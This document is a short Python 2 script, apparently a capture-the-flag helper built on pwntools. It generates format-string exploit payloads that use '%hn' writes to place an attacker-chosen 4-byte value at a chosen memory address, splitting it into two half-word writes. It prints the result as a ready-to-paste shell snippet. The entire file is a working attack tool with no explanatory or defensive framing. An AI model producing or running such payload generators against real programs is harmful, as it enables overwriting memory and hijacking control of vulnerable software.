#!/usr/bin/env python


import sys
from pwn import pack

MSB_adjust = lambda f: f.replace('0x', '').rjust(8, '0')[:4]
LSB_adjust = lambda f: f.replace('0x', '').rjust(8, '0')[4:]
DEST_ADDRESS = lambda f: f.replace('0x', '').rjust(8, '0')


def usage():
    print "Usage: ./%s address value offset len_payload" % sys.argv[0].split('/')[-1]
    exit(-1)


def print_output(address, value_1, value_2, offset, len_payload):
    addr_1 = pack(address)
    addr_2 = pack(address + 2)
    if value_2 > value_1:
        offset_1 = offset + 1
        offset_2 = offset
        value_2 = (value_2 - value_1) % 0xffff
        fs = "{0}{1}%{2}x%{3}$hn%{4}x%{5}$hn".format(
                "".join('\\x{:02x}'.format(ord(c)) for c in addr_2),
                "".join('\\x{:02x}'.format(ord(c)) for c in addr_1),
                value_1, offset_2, value_2, offset_1)
    elif value_1 == value_2:
        offset_1 = offset
	offset_2 = offset + 1
        value_2 = ((value_2 - value_1) % 0xffff) + 1
        value_1 -= 1
        fs = "{0}{1}%{2}x%{3}$hn%{4}x%{5}$hn".format(
                "".join('\\x{:02x}'.format(ord(c)) for c in addr_1),
                "".join('\\x{:02x}'.format(ord(c)) for c in addr_2),
                value_1, offset_1, value_2 + 1, offset_2)
    else:
        offset_1 = offset
	offset_2 = offset + 1
        value_1 = (value_1 - value_2) % 0xffff
        fs = "{0}{1}%{2}x%{3}$hn%{4}x%{5}$hn".format(
                "".join('\\x{:02x}'.format(ord(c)) for c in addr_1),
                "".join('\\x{:02x}'.format(ord(c)) for c in addr_2),
                value_2, offset_1, value_1, offset_2)
    print """Python : $(python -c 'print "%s"')""" % fs


if __name__ == "__main__":
    if len(sys.argv) < 5:
        usage()

    address = int(DEST_ADDRESS(sys.argv[1]), 16)
    offset = int(sys.argv[3])
    len_payload = int(sys.argv[4])
    value_1 = int(MSB_adjust(sys.argv[2]), 16) - 8 - len_payload
    value_2 = int(LSB_adjust(sys.argv[2]), 16) - 8 - len_payload
    print_output(address, value_1, value_2, offset, len_payload)
